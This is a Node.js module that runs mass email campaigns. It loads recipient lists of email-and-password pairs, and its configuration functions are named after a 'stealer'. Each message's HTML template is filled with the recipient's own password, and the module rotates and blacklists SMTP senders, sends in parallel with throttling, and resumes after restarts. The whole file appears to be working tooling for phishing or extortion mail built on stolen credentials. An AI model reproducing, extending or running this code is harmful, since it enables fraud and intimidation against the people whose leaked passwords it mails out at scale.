'use strict';

const fs = require('fs');
const path = require('path');
const mailService = require('./mailService');
const { DATA_DIR } = require('../db/database.js');

const SNAPSHOT_PATH = path.join(DATA_DIR, 'mailer-campaign-snapshot.json');
const RECIPIENTS_PATH = path.join(DATA_DIR, 'mailer-campaign-recipients.json');
const SNAPSHOT_LOG_MAX = 400;
let snapshotPersistTimer = null;

const MAILER_CAMPAIGN_LOG_MAX = 500;
const MAILER_CAMPAIGN_MAX_CONCURRENT_SENDS = 20;
const STDERR_LOG = String(process.env.MAILER_CAMPAIGN_STDERR_LOG || '').trim() === '1';

/** Реже fs.write + JSON.stringify при тысячах строк лога — меньше лагов event loop. */
const SNAPSHOT_DEBOUNCE_MS = (function () {
  const n = parseInt(process.env.MAILER_SNAPSHOT_DEBOUNCE_MS || '4500', 10);
  return Number.isFinite(n) && n >= 1500 && n <= 120000 ? n : 4500;
})();

/** Переиспользование SMTP-соединений (раньше: новый createTransport на каждое письмо → лаги и TLS-handshake). */
const smtpTransporterPool = new Map();

const mailerCampaignState = {
  running: false,
  paused: false,
  stopped: false,
  activeSendCount: 0,
  leads: [],
  total: 0,
  sent: 0,
  failed: 0,
  cursor: 0,
  delayMs: 1500,
  numThreads: 1,
  configId: null,
  configName: '',
  smtpList: [],
  smtpRotation: 0,
  /** Шаблон письма без image1Base64 в RAM — картинка один Buffer. */
  mailTemplate: null,
  log: [],
  /** Последняя успешная доставка (для паузы / статуса). */
  lastSuccessEmail: '',
  /** Последняя попытка с ошибкой SMTP. */
  lastFailedEmail: '',
};

function clampInt(v, min, max, fallback) {
  const n = typeof v === 'number' ? v : parseInt(v, 10);
  if (!Number.isFinite(n)) return fallback;
  if (n < min) return min;
  if (n > max) return max;
  return n;
}

function clampFloat(v, min, max, fallback) {
  const n = typeof v === 'number' ? v : parseFloat(v);
  if (!Number.isFinite(n)) return fallback;
  if (n < min) return min;
  if (n > max) return max;
  return n;
}

function readMailerSnapshotFile() {
  try {
    if (!fs.existsSync(SNAPSHOT_PATH)) return null;
    const raw = fs.readFileSync(SNAPSHOT_PATH, 'utf8');
    const o = JSON.parse(raw);
    return o && typeof o === 'object' ? o : null;
  } catch (e) {
    return null;
  }
}

function unlinkMailerSnapshotFile() {
  try {
    if (fs.existsSync(SNAPSHOT_PATH)) fs.unlinkSync(SNAPSHOT_PATH);
  } catch (e) { /* ignore */ }
}

function cancelMailerSnapshotPersistTimer() {
  if (snapshotPersistTimer) {
    clearTimeout(snapshotPersistTimer);
    snapshotPersistTimer = null;
  }
}

function writeRecipientsFile(recipients) {
  const list = sanitizeRecipients(recipients);
  const tmp = RECIPIENTS_PATH + '.tmp';
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(tmp, JSON.stringify(list), 'utf8');
  fs.renameSync(tmp, RECIPIENTS_PATH);
}

function readRecipientsFile() {
  try {
    if (!fs.existsSync(RECIPIENTS_PATH)) return [];
    const raw = fs.readFileSync(RECIPIENTS_PATH, 'utf8');
    const arr = JSON.parse(raw);
    return sanitizeRecipients(arr);
  } catch (e) {
    return [];
  }
}

function unlinkRecipientsFile() {
  try {
    if (fs.existsSync(RECIPIENTS_PATH)) fs.unlinkSync(RECIPIENTS_PATH);
    const tmp = RECIPIENTS_PATH + '.tmp';
    if (fs.existsSync(tmp)) fs.unlinkSync(tmp);
  } catch (e) { /* ignore */ }
}

function disposeSmtpTransporterPool() {
  for (const tr of smtpTransporterPool.values()) {
    try {
      if (tr && typeof tr.close === 'function') tr.close();
    } catch (_) { /* ignore */ }
  }
  smtpTransporterPool.clear();
}

function cleanupFinishedCampaignDiskArtifacts() {
  cancelMailerSnapshotPersistTimer();
  disposeSmtpTransporterPool();
  mailerCampaignState.mailTemplate = null;
  unlinkMailerSnapshotFile();
  unlinkRecipientsFile();
}

function flushMailerSnapshotToDisk() {
  try {
    const c = mailerCampaignState;
    if (!(c.running || c.paused || (c.total | 0) > 0 || (c.log && c.log.length))) {
      unlinkMailerSnapshotFile();
      return;
    }
    const payload = {
      version: 1,
      at: new Date().toISOString(),
      running: !!c.running,
      paused: !!c.paused,
      stopped: !!c.stopped,
      total: c.total | 0,
      sent: c.sent | 0,
      failed: c.failed | 0,
      cursor: c.cursor | 0,
      activeSendCount: c.activeSendCount | 0,
      configId: c.configId,
      configName: c.configName || '',
      lastSuccessEmail: String(c.lastSuccessEmail || '').trim(),
      lastFailedEmail: String(c.lastFailedEmail || '').trim(),
      numThreads: c.numThreads | 0,
      delayMs: c.delayMs | 0,
      smtpRotation: c.smtpRotation | 0,
      log: (c.log || []).slice(-SNAPSHOT_LOG_MAX)
    };
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(SNAPSHOT_PATH, JSON.stringify(payload), 'utf8');
  } catch (e) {
    console.warn('[mailer-campaign] snapshot write:', e && e.message ? e.message : e);
  }
}

function scheduleMailerSnapshotPersist() {
  if (snapshotPersistTimer) clearTimeout(snapshotPersistTimer);
  snapshotPersistTimer = setTimeout(function () {
    snapshotPersistTimer = null;
    flushMailerSnapshotToDisk();
  }, SNAPSHOT_DEBOUNCE_MS);
}

function pushLog(text, type) {
  const t = String(text || '');
  const ty = type || '';
  mailerCampaignState.log.push({ text: t, type: ty });
  if (mailerCampaignState.log.length > MAILER_CAMPAIGN_LOG_MAX) {
    mailerCampaignState.log = mailerCampaignState.log.slice(-MAILER_CAMPAIGN_LOG_MAX);
  }
  if (STDERR_LOG) console.error('[mailer-campaign]', t);
  scheduleMailerSnapshotPersist();
}

function sanitizeRecipients(recipients) {
  if (!Array.isArray(recipients)) return [];
  const out = [];
  for (let i = 0; i < recipients.length; i++) {
    const r = recipients[i] || {};
    const email = String(r.email || '').trim();
    if (!email) continue;
    out.push({
      email: email,
      password: String(r.password || ''),
    });
  }
  return out;
}

function pickStealerConfig(configId) {
  const data = mailService.readStealerEmailConfig();
  let cfg = null;
  if (configId) {
    cfg = (data.configs || []).find(function (c) { return String(c.id) === String(configId); }) || null;
  }
  if (!cfg) cfg = data.current || null;
  if (!cfg || !(cfg.smtpLine && String(cfg.smtpLine).trim())) {
    cfg = (data.configs || []).find(function (c) { return c.smtpLine && String(c.smtpLine).trim(); }) || null;
  }
  return cfg;
}

/**
 * Один раз при старте кампании: html-шаблон + один Buffer для CID (без удержания image1Base64-строки в памяти).
 */
function prepareMailTemplateFromCfg(cfg) {
  let htmlPattern = String((cfg && cfg.html) || '');
  let imageAttachment = null;
  const hasPh = htmlPattern.indexOf('_src1_') !== -1;
  if (cfg && cfg.image1Base64 && hasPh) {
    try {
      const buf = Buffer.from(String(cfg.image1Base64), 'base64');
      const cid = 'image1@mail';
      htmlPattern = htmlPattern.replace(/_src1_/g, 'cid:' + cid);
      imageAttachment = {
        filename: 'image1.png',
        contentType: 'image/png',
        contentTransferEncoding: 'base64',
        content: buf,
        cid: cid
      };
    } catch (_) {
      htmlPattern = htmlPattern.replace(/_src1_/g, '');
    }
  } else if (hasPh) {
    htmlPattern = htmlPattern.replace(/_src1_/g, '');
  }
  return {
    senderName: (cfg && cfg.senderName) || '',
    title: String((cfg && cfg.title) || '').trim() || 'Message',
    htmlPattern,
    imageAttachment
  };
}

function buildMailPayloadFromTemplate(tpl, toEmail, password) {
  if (!tpl) return { html: '', attachments: undefined };
  const html = String(tpl.htmlPattern || '')
    .replace(/_email_/g, toEmail)
    .replace(/_password_/g, password || '');
  let attachments;
  if (tpl.imageAttachment) {
    const a = tpl.imageAttachment;
    attachments = [{
      filename: a.filename,
      contentType: a.contentType,
      contentTransferEncoding: a.contentTransferEncoding,
      content: a.content,
      cid: a.cid
    }];
  }
  return { html, attachments };
}

function smtpTransporterPoolKey(smtp) {
  return String(smtp.host) + '\n' + (smtp.port | 0) + '\n' + String(smtp.user) + '\n' + String(smtp.fromEmail);
}

function getOrCreatePooledTransporter(nodemailer, smtp) {
  const key = smtpTransporterPoolKey(smtp);
  let tr = smtpTransporterPool.get(key);
  if (!tr) {
    tr = nodemailer.createTransport({
      pool: true,
      maxConnections: Math.min(12, Math.max(4, (mailerCampaignState.numThreads | 0) * 3)),
      maxMessages: 500,
      host: smtp.host,
      port: smtp.port,
      secure: smtp.port === 465,
      auth: { user: smtp.user, pass: smtp.password },
      connectionTimeout: 25000,
      greetingTimeout: 25000,
      socketTimeout: 90000
    });
    smtpTransporterPool.set(key, tr);
  }
  return tr;
}

function pickJobSync() {
  if (mailerCampaignState.cursor >= mailerCampaignState.total) return 'done';
  if (!mailerCampaignState.smtpList.length) return 'empty';
  const idx = mailerCampaignState.cursor++;
  const lead = mailerCampaignState.leads[idx];
  const toEmail = String(lead && lead.email ? lead.email : '').trim();
  if (!toEmail) return { skip: true };
  const password = String(lead && lead.password ? lead.password : '');
  const smtpIdx = mailerCampaignState.smtpRotation % mailerCampaignState.smtpList.length;
  mailerCampaignState.smtpRotation = (mailerCampaignState.smtpRotation + 1) | 0;
  const smtp = mailerCampaignState.smtpList[smtpIdx];
  return { idx, toEmail, password, smtp };
}

function schedulePump() {
  setImmediate(runPump);
}

function runPump() {
  if (mailerCampaignState.stopped) {
    if (mailerCampaignState.activeSendCount <= 0) {
      mailerCampaignState.running = false;
      pushLog('Рассылка остановлена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'muted');
    }
    return;
  }
  if (!mailerCampaignState.running) return;
  if (mailerCampaignState.paused) {
    setTimeout(schedulePump, 500);
    return;
  }
  const maxConcurrent = Math.min(
    MAILER_CAMPAIGN_MAX_CONCURRENT_SENDS,
    Math.max(1, mailerCampaignState.numThreads | 0)
  );
  while (
    mailerCampaignState.running
    && !mailerCampaignState.paused
    && !mailerCampaignState.stopped
    && mailerCampaignState.activeSendCount < maxConcurrent
  ) {
    const job = pickJobSync();
    if (job === 'done') {
      if (mailerCampaignState.activeSendCount <= 0) {
        mailerCampaignState.running = false;
        pushLog('Рассылка завершена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'success');
        cleanupFinishedCampaignDiskArtifacts();
      }
      return;
    }
    if (job === 'empty') {
      mailerCampaignState.running = false;
      pushLog('Рассылка завершена: нет доступных SMTP.', 'error');
      cleanupFinishedCampaignDiskArtifacts();
      return;
    }
    if (job.skip) {
      mailerCampaignState.sent++;
      continue;
    }
    const nodemailer = mailService.getNodemailer();
    if (!nodemailer) {
      mailerCampaignState.running = false;
      pushLog('Ошибка: nodemailer не установлен.', 'error');
      cleanupFinishedCampaignDiskArtifacts();
      return;
    }
    const smtp = job.smtp;
    const tpl = mailerCampaignState.mailTemplate;
    if (!tpl) {
      mailerCampaignState.running = false;
      pushLog('Ошибка: нет шаблона письма (внутреннее состояние кампании).', 'error');
      cleanupFinishedCampaignDiskArtifacts();
      return;
    }
    const sn = tpl.senderName ? String(tpl.senderName).replace(/"/g, '') : '';
    const fromStr = sn ? '"' + sn + '" <' + smtp.fromEmail + '>' : smtp.fromEmail;
    const built = buildMailPayloadFromTemplate(tpl, job.toEmail, job.password);
    const transporter = getOrCreatePooledTransporter(nodemailer, smtp);
    const mailOptions = {
      from: fromStr,
      to: job.toEmail,
      subject: tpl.title || 'Message',
      html: built.html,
      attachments: built.attachments,
      envelope: { from: smtp.fromEmail, to: job.toEmail },
      /** HTML — quoted-printable; с cid-вложением nodemailer даёт multipart/related, картинка — отдельная MIME-часть (base64 CTE — норма для binary). */
      textEncoding: 'quoted-printable'
    };
    mailerCampaignState.activeSendCount++;
    transporter.sendMail(mailOptions).then(function () {
      mailerCampaignState.sent++;
      mailerCampaignState.lastSuccessEmail = job.toEmail;
      const num = job.idx + 1;
      pushLog('Отправлено ' + num + '/' + mailerCampaignState.total + ': с ' + smtp.fromEmail + ' на ' + job.toEmail, 'success');
    }).catch(function (err) {
      mailerCampaignState.failed++;
      mailerCampaignState.lastFailedEmail = job.toEmail;
      const msg = (err && err.message ? String(err.message) : String(err || 'send error')).slice(0, 200);
      pushLog('Ошибка отправки на ' + job.toEmail + ': ' + msg, 'error');
      mailService.sendStealerFailedSmtpEmails.add(smtp.fromEmail);
    }).finally(function () {
      mailerCampaignState.activeSendCount--;
      if (mailerCampaignState.stopped || !mailerCampaignState.running) {
        if (mailerCampaignState.activeSendCount <= 0 && mailerCampaignState.stopped) {
          mailerCampaignState.running = false;
          disposeSmtpTransporterPool();
          mailerCampaignState.mailTemplate = null;
        }
        return;
      }
      if (mailerCampaignState.cursor >= mailerCampaignState.total && mailerCampaignState.activeSendCount <= 0) {
        mailerCampaignState.running = false;
        pushLog('Рассылка завершена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'success');
        cleanupFinishedCampaignDiskArtifacts();
        return;
      }
      setTimeout(schedulePump, mailerCampaignState.delayMs);
    });
  }
}

function startCampaign(payload) {
  if (mailerCampaignState.running) {
    return { ok: false, statusCode: 400, error: 'Рассылка уже запущена' };
  }
  disposeSmtpTransporterPool();
  const nodemailer = mailService.getNodemailer();
  if (!nodemailer) {
    return { ok: false, statusCode: 500, error: 'nodemailer not installed' };
  }
  const recipients = sanitizeRecipients(payload && payload.recipients);
  if (!recipients.length) {
    return { ok: false, statusCode: 400, error: 'Нет получателей. Заполните базу email.' };
  }
  const configId = payload && payload.configId ? String(payload.configId).trim() : null;
  const cfg = pickStealerConfig(configId);
  if (!cfg || !(cfg.smtpLine && String(cfg.smtpLine).trim())) {
    return { ok: false, statusCode: 400, error: 'В конфиге не задан SMTP.' };
  }
  const smtpList = mailService.parseSmtpLines(cfg.smtpLine).filter(function (s) {
    return !mailService.sendStealerFailedSmtpEmails.has(s.fromEmail);
  });
  if (!smtpList.length) {
    return { ok: false, statusCode: 400, error: 'Нет доступных SMTP (все отключены после ошибок).' };
  }
  const numThreads = clampInt(payload && payload.numThreads, 1, 20, 1);
  const delaySec = clampFloat(payload && payload.delaySec, 0.5, 60, 1.5);
  mailerCampaignState.running = true;
  mailerCampaignState.paused = false;
  mailerCampaignState.stopped = false;
  mailerCampaignState.activeSendCount = 0;
  mailerCampaignState.leads = recipients;
  mailerCampaignState.total = recipients.length;
  mailerCampaignState.sent = 0;
  mailerCampaignState.failed = 0;
  mailerCampaignState.cursor = 0;
  mailerCampaignState.delayMs = Math.round(delaySec * 1000);
  mailerCampaignState.numThreads = numThreads;
  mailerCampaignState.configId = cfg.id || null;
  mailerCampaignState.configName = cfg.name || '';
  mailerCampaignState.smtpList = smtpList;
  mailerCampaignState.smtpRotation = 0;
  mailerCampaignState.mailTemplate = prepareMailTemplateFromCfg(cfg);
  mailerCampaignState.log = [];
  mailerCampaignState.lastSuccessEmail = '';
  mailerCampaignState.lastFailedEmail = '';
  cancelMailerSnapshotPersistTimer();
  unlinkMailerSnapshotFile();
  writeRecipientsFile(recipients);
  pushLog('Рассылка запущена. Всего: ' + recipients.length + ', потоков: ' + numThreads + ', задержка: ' + delaySec + ' сек.', 'muted');
  schedulePump();
  flushMailerSnapshotToDisk();
  return { ok: true };
}

function pauseCampaign(payload) {
  if (!mailerCampaignState.running) return { ok: true, paused: false };
  const wasPaused = mailerCampaignState.paused;
  mailerCampaignState.paused = !mailerCampaignState.paused;
  if (wasPaused && !mailerCampaignState.paused) {
    mailerCampaignState.numThreads = clampInt(payload && payload.numThreads, 1, 20, mailerCampaignState.numThreads || 1);
    const delaySec = clampFloat(payload && payload.delaySec, 0.5, 60, mailerCampaignState.delayMs / 1000 || 1.5);
    mailerCampaignState.delayMs = Math.round(delaySec * 1000);
    pushLog('Рассылка продолжена.', 'muted');
    schedulePump();
  } else if (mailerCampaignState.paused) {
    const c = mailerCampaignState.cursor | 0;
    const L = mailerCampaignState.leads;
    const next =
      c >= 0 && c < L.length ? String((L[c] && L[c].email) || '').trim() : '';
    const parts = [
      'Рассылка на паузе. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.',
      next ? 'Следующий в очереди: ' + next + '.' : '',
      mailerCampaignState.lastSuccessEmail
        ? 'Последняя успешная отправка: ' + mailerCampaignState.lastSuccessEmail + '.'
        : '',
      mailerCampaignState.activeSendCount > 0
        ? 'В обработке писем: ' + mailerCampaignState.activeSendCount + ' (дождитесь завершения).'
        : ''
    ].filter(Boolean);
    pushLog(parts.join(' '), 'muted');
  }
  return { ok: true, paused: mailerCampaignState.paused };
}

function stopCampaign() {
  if (!mailerCampaignState.running && !mailerCampaignState.paused) return { ok: true };
  mailerCampaignState.stopped = true;
  mailerCampaignState.paused = false;
  mailerCampaignState.running = false;
  if (mailerCampaignState.activeSendCount <= 0) {
    pushLog('Рассылка остановлена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'muted');
    disposeSmtpTransporterPool();
    mailerCampaignState.mailTemplate = null;
  }
  cancelMailerSnapshotPersistTimer();
  unlinkRecipientsFile();
  flushMailerSnapshotToDisk();
  return { ok: true };
}

function nextRecipientEmail() {
  const c = mailerCampaignState.cursor | 0;
  const L = mailerCampaignState.leads;
  if (c < 0 || c >= L.length) return '';
  return String((L[c] && L[c].email) || '').trim();
}

function getStatus() {
  const logLive = mailerCampaignState.log.slice(-MAILER_CAMPAIGN_LOG_MAX);
  const base = {
    running: !!mailerCampaignState.running,
    paused: !!mailerCampaignState.paused,
    stopped: !!mailerCampaignState.stopped,
    sent: mailerCampaignState.sent | 0,
    failed: mailerCampaignState.failed | 0,
    total: mailerCampaignState.total | 0,
    cursor: mailerCampaignState.cursor | 0,
    nextRecipientEmail: nextRecipientEmail(),
    lastSuccessEmail: String(mailerCampaignState.lastSuccessEmail || '').trim(),
    lastFailedEmail: String(mailerCampaignState.lastFailedEmail || '').trim(),
    activeSendCount: mailerCampaignState.activeSendCount | 0,
    numThreads: mailerCampaignState.numThreads | 0,
    delayMs: mailerCampaignState.delayMs | 0,
    configId: mailerCampaignState.configId,
    configName: mailerCampaignState.configName || '',
    log: logLive,
    recoveredFromSnapshot: false
  };
  const processEmpty =
    !base.running &&
    !base.paused &&
    (base.total | 0) === 0 &&
    (base.sent | 0) === 0 &&
    logLive.length === 0;
  if (!processEmpty) return base;
  const snap = readMailerSnapshotFile();
  if (!snap || snap.version !== 1) return base;
  const ageMs = Date.now() - new Date(snap.at || 0).getTime();
  if (!Number.isFinite(ageMs) || ageMs < 0 || ageMs > 48 * 3600000) return base;
  if ((snap.total | 0) === 0 && !(Array.isArray(snap.log) && snap.log.length)) return base;
  return Object.assign({}, base, {
    total: snap.total | 0,
    sent: snap.sent | 0,
    failed: snap.failed | 0,
    cursor: snap.cursor | 0,
    configId: snap.configId,
    configName: snap.configName || '',
    lastSuccessEmail: String(snap.lastSuccessEmail || '').trim(),
    lastFailedEmail: String(snap.lastFailedEmail || '').trim(),
    numThreads: snap.numThreads | 0,
    delayMs: snap.delayMs | 0,
    log: Array.isArray(snap.log) ? snap.log.slice(-MAILER_CAMPAIGN_LOG_MAX) : logLive,
    recoveredFromSnapshot: true,
    nextRecipientEmail: ''
  });
}

function clearLog() {
  mailerCampaignState.log = [];
  cancelMailerSnapshotPersistTimer();
  if (mailerCampaignState.running || mailerCampaignState.paused) {
    flushMailerSnapshotToDisk();
    return;
  }
  disposeSmtpTransporterPool();
  mailerCampaignState.mailTemplate = null;
  unlinkMailerSnapshotFile();
  unlinkRecipientsFile();
}

/**
 * После рестарта PM2/Node снимок может содержать running:true, но очередь и pump живут только в RAM.
 * Если есть mailer-campaign-recipients.json той же длины, что snap.total — поднимаем кампанию снова.
 */
function restoreMailerCampaignAfterRestartIfNeeded() {
  const optOut = String(process.env.MAILER_CAMPAIGN_RESUME_ON_START || '1').trim().toLowerCase();
  if (optOut === '0' || optOut === 'false' || optOut === 'off') return;
  if (mailerCampaignState.running) return;
  disposeSmtpTransporterPool();
  const snap = readMailerSnapshotFile();
  if (!snap || snap.version !== 1) return;
  const ageMs = Date.now() - new Date(snap.at || 0).getTime();
  if (!Number.isFinite(ageMs) || ageMs < 0 || ageMs > 48 * 3600000) return;
  if (!snap.running || snap.stopped) return;
  const total = snap.total | 0;
  const cursor = snap.cursor | 0;
  if (total <= 0 || cursor >= total) return;
  const recipients = readRecipientsFile();
  if (!recipients.length || recipients.length !== total) {
    console.warn(
      '[mailer-campaign] Автовозобновление пропущено: нет data/mailer-campaign-recipients.json или длина≠total (' +
        recipients.length + ' vs ' + total + '). Нажмите Старт в Mailer с той же базой.'
    );
    return;
  }
  const cfg = pickStealerConfig(snap.configId);
  if (!cfg || !(cfg.smtpLine && String(cfg.smtpLine).trim())) {
    console.warn('[mailer-campaign] Автовозобновление пропущено: не найден конфиг SMTP (configId из снимка).');
    return;
  }
  const smtpList = mailService.parseSmtpLines(cfg.smtpLine).filter(function (s) {
    return !mailService.sendStealerFailedSmtpEmails.has(s.fromEmail);
  });
  if (!smtpList.length) {
    console.warn('[mailer-campaign] Автовозобновление пропущено: список SMTP пуст после фильтра ошибок.');
    return;
  }
  const nodemailer = mailService.getNodemailer();
  if (!nodemailer) {
    console.warn('[mailer-campaign] Автовозобновление пропущено: nodemailer не установлен.');
    return;
  }
  mailerCampaignState.running = true;
  mailerCampaignState.paused = !!snap.paused;
  mailerCampaignState.stopped = false;
  mailerCampaignState.activeSendCount = 0;
  mailerCampaignState.leads = recipients;
  mailerCampaignState.total = total;
  mailerCampaignState.sent = snap.sent | 0;
  mailerCampaignState.failed = snap.failed | 0;
  mailerCampaignState.cursor = cursor;
  mailerCampaignState.delayMs = Math.max(500, snap.delayMs | 0) || 1500;
  mailerCampaignState.numThreads = clampInt(snap.numThreads, 1, 20, 1);
  mailerCampaignState.configId = snap.configId;
  mailerCampaignState.configName = snap.configName || '';
  mailerCampaignState.smtpList = smtpList;
  mailerCampaignState.smtpRotation = snap.smtpRotation | 0;
  mailerCampaignState.mailTemplate = prepareMailTemplateFromCfg(cfg);
  mailerCampaignState.log = Array.isArray(snap.log) ? snap.log.slice(-MAILER_CAMPAIGN_LOG_MAX) : [];
  mailerCampaignState.lastSuccessEmail = String(snap.lastSuccessEmail || '').trim();
  mailerCampaignState.lastFailedEmail = String(snap.lastFailedEmail || '').trim();
  pushLog(
    'Сервер перезапущен — рассылка продолжена с позиции ' + cursor + '/' + total + ' (снимок + база получателей).',
    'muted'
  );
  schedulePump();
  flushMailerSnapshotToDisk();
}

module.exports = {
  MAILER_CAMPAIGN_LOG_MAX,
  MAILER_CAMPAIGN_MAX_CONCURRENT_SENDS,
  mailerCampaignState,
  startCampaign,
  pauseCampaign,
  stopCampaign,
  getStatus,
  clearLog,
  restoreMailerCampaignAfterRestartIfNeeded,
};
